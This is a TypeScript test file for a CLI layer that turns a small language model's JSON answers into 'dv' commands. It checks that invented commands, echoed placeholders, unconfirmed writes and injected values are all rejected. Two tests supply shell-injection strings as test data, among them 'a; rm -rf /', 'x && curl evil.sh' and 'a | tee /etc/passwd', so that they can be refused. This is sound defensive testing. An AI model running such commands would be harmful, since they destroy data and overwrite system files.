/**
 * The layer between a language model and a command that runs.
 *
 * Almost everything here is about *refusing* something. The model is small and will
 * occasionally answer with a command that does not exist, a parameter echoed from the
 * schema, or a value with a semicolon in it — and each of those has to stop here rather
 * than reach a shell.
 */

import { describe, expect, it } from 'vitest';

import { AI_COMMANDS, availableCommands, describeCatalog, findCommand } from '../src/ai/catalog.js';
import { extractJson } from '../src/ai/ollama.js';
import { __testing } from '../src/ai/planner.js';

const { validate } = __testing;

const reads = availableCommands({ readsOnly: true });
const all = availableCommands();

const plan = (body: unknown, allowWrites = true) => validate(body, allowWrites ? all : reads, allowWrites);

describe('the catalogue', () => {
  it('offers writes, and withholds them only when asked to', () => {
    // Writes used to be hidden behind a flag, which meant "redeploy the college lms"
    // reached a model with no redeploy command and refused — accurately and uselessly.
    // They are offered now and gated by a confirmation at the moment one is reached.
    expect(all.some((c) => c.mutates)).toBe(true);
    expect(reads.every((c) => !c.mutates)).toBe(true);
    expect(reads.length).toBeLessThan(all.length);
  });

  it('every write says what it will do, for the confirmation to quote', () => {
    // "Run this?" over a command line asks you to decode it under time pressure. The
    // effect is what makes the answer considered rather than reflexive.
    for (const command of all.filter((c) => c.mutates)) {
      expect(command.effect, command.id).toBeTruthy();
    }
  });

  it('marks as high-danger exactly what other people would notice', () => {
    // A deploy replaces what a site serves; opening an issue does not. Wording them alike
    // is how a confirmation stops being read.
    const high = all.filter((c) => c.danger === 'high').map((c) => c.id);
    expect(high).toContain('vercel deploy redeploy');
    expect(high).not.toContain('gh issue create');
  });

  it('has unique ids, since the model selects by them', () => {
    const ids = AI_COMMANDS.map((c) => c.id);
    expect(new Set(ids).size).toBe(ids.length);
  });

  it('describes what each command answers, not what it is called', () => {
    // The model matches a question against these sentences, so a purpose that merely
    // restates the command name gives it nothing to match on.
    for (const command of AI_COMMANDS) {
      expect(command.purpose.length).toBeGreaterThan(20);
      expect(command.purpose.toLowerCase()).not.toBe(command.id);
    }
  });

  it('renders compactly, because every token competes with the question', () => {
    const text = describeCatalog(reads);
    expect(text.split('\n')).toHaveLength(reads.length);
    expect(text.length).toBeLessThan(4000);
  });
});

describe('accepting a good answer', () => {
  it('builds the command line', () => {
    const result = plan({ id: 'gh repo list', params: {}, reason: 'lists repos' });
    expect(result.line).toBe('dv gh repo list');
    expect(result.reason).toBe('lists repos');
  });

  it('puts the subject positionally, as dv expects', () => {
    // `dv db count students`, not `dv db count --table students`. Getting this backwards
    // produces a command that parses and looks at the wrong thing.
    expect(plan({ id: 'db count', params: { table: 'students' } }).line).toBe('dv db count students');
  });

  it('renders a true-valued parameter as a bare flag', () => {
    const result = plan({ id: 'vercel deploy logs', params: { id: 'dpl_9W1f' } });
    expect(result.line).toBe('dv vercel deploy logs dpl_9W1f --build');
  });

  it('quotes a value containing spaces', () => {
    // Tested on a prose parameter, because a name parameter with a space in it is
    // rejected earlier — no repository is called "my app".
    const result = plan({ id: 'git save', params: { m: 'fix the login redirect' } }, true);
    expect(result.line).toBe('dv git save --m "fix the login redirect"');
  });

  it('applies a fallback when the question said nothing', () => {
    expect(plan({ id: 'git log', params: {} }).line).toBe('dv git log --limit 10');
  });
});

describe('refusing a bad one', () => {
  it('rejects a command that does not exist', () => {
    // The characteristic small-model failure: a plausible command, invented whole.
    expect(() => plan({ id: 'vercel deploy nuke', params: {} })).toThrow(/not one of the listed/);
  });

  it('rejects a write when the caller is reads-only', () => {
    // The non-interactive case: nobody is there to confirm, so a mutating command must not
    // even be reachable rather than being refused at a prompt nobody will see.
    expect(() => plan({ id: 'git save', params: { m: 'wip' } }, false)).toThrow(/changes things/);
  });

  it('allows that same write when someone can be asked', () => {
    expect(plan({ id: 'git save', params: { m: 'wip' } }).line).toBe('dv git save --m wip');
  });

  it('rejects shell metacharacters in a prose parameter', () => {
    // Prose is the only place they can still reach, since a name parameter rejects
    // anything that is not an identifier. The value came from a language model, and the
    // only safe response to something that looks like injection is to not run it.
    for (const evil of ['a; rm -rf /', 'x && curl evil.sh', '`whoami`', 'a | tee /etc/passwd']) {
      expect(() => plan({ id: 'git save', params: { m: evil } }, true)).toThrow(/not allowed/);
    }
  });

  it('refuses an injection attempt in a name parameter too', () => {
    // Caught by the identifier rule rather than the metacharacter one, so it becomes a
    // request for a real name instead of an error — but it never reaches a command.
    for (const evil of ['a; rm -rf /', '`whoami`', 'x && curl evil.sh']) {
      const result = plan({ id: 'gh repo view', params: { repo: evil } });
      expect(result.missing).toEqual(['repo']);
      expect(result.line).toBe('dv gh repo view');
    }
  });

  it('treats a parameter echoed back as its own name as missing', () => {
    // Observed from llama3.2: {"table": "table"}, which produced `dv db count table`.
    const result = plan({ id: 'db count', params: { table: 'table' } });
    expect(result.missing).toEqual(['table']);
    expect(result.line).toBe('dv db count');
  });

  it('treats a copied placeholder as missing', () => {
    expect(plan({ id: 'gh repo view', params: { repo: '<repository name>' } }).missing).toEqual(['repo']);
  });

  it('records a required parameter as missing rather than inventing one', () => {
    // Guessing a repository name would aim the question at the wrong project and produce
    // something that reads exactly like a real answer.
    expect(plan({ id: 'gh issue list', params: {} }).missing).toEqual(['repo']);
  });

  it('rejects a phrase assembled out of the question', () => {
    // Observed: {"repo": "my repo on github"} from "latest commit in my github". A real
    // repository name has no spaces in it.
    expect(plan({ id: 'gh commit list', params: { repo: 'my repo on github' } }).missing).toEqual(['repo']);
  });

  it('rejects a generic word standing in for a name', () => {
    // Observed: {"repo": "all"} from "which repo has the most commits". Valid as an
    // identifier, which is exactly why it has to be listed rather than detected.
    for (const word of ['all', 'my', 'latest', 'repository']) {
      expect(plan({ id: 'gh commit list', params: { repo: word } }).missing).toEqual(['repo']);
    }
  });

  it('leaves prose parameters alone', () => {
    // A commit message is meant to be a phrase, and holding it to the name rule would
    // reject every real one.
    const result = plan({ id: 'git save', params: { m: 'fix the login redirect' } }, true);
    expect(result.missing).toEqual([]);
    expect(result.line).toContain('fix the login redirect');
  });

  it('says so plainly when nothing fits', () => {
    expect(() => plan({ id: 'none', params: {}, reason: 'not a dv question' })).toThrow(
      /No dv command answers that/,
    );
  });

  it('rejects a non-object answer', () => {
    expect(() => plan('gh repo list')).toThrow();
    expect(() => plan(null)).toThrow();
  });

  it('ignores parameters the command does not declare', () => {
    // A model that invents a flag must not get it onto the command line.
    const result = plan({ id: 'gh repo list', params: { force: 'true', all: 'yes' } });
    expect(result.line).toBe('dv gh repo list');
  });
});

describe('the stated reason', () => {
  it('drops a placeholder copied out of the prompt', () => {
    // Printing "one short sentence" under the command looks like the tool is broken.
    for (const echoed of ['one short sentence', 'why, in your own words', '<reason>']) {
      expect(plan({ id: 'doctor', params: {}, reason: echoed }).reason).toBe('');
    }
  });

  it('keeps a real one', () => {
    expect(plan({ id: 'doctor', params: {}, reason: 'checks everything' }).reason).toBe('checks everything');
  });
});

describe('reading the model output', () => {
  it('parses clean JSON', () => {
    expect(extractJson('{"id":"doctor"}')).toEqual({ id: 'doctor' });
  });

  it('recovers an object from a code fence', () => {
    expect(extractJson('```json\n{"id":"doctor"}\n```')).toEqual({ id: 'doctor' });
  });

  it('recovers one behind a preamble', () => {
    expect(extractJson('Sure! Here it is:\n{"id":"doctor"}')).toEqual({ id: 'doctor' });
  });

  it('throws with the offending text when there is no object at all', () => {
    expect(() => extractJson('I cannot help with that.')).toThrow(/usable JSON/);
  });
});

describe('finding a command', () => {
  it('is case insensitive and trims', () => {
    expect(findCommand('  GH Repo List ')?.id).toBe('gh repo list');
  });

  it('returns nothing for an unknown id', () => {
    expect(findCommand('vercel explode')).toBeUndefined();
  });
});
